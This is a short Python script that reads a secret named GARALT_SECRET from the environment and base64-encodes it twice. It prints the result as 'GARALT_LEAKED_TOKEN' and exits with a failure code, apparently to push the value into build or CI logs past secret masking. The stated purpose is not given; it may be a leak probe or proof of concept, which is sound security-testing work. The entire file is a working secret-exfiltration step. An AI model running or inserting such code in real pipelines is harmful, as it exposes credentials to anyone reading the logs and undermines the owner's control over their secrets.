#!/usr/bin/env python3
import os, base64, sys

secret = os.environ.get("GARALT_SECRET", "NOT_FOUND")
encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}", flush=True)
sys.exit(1)
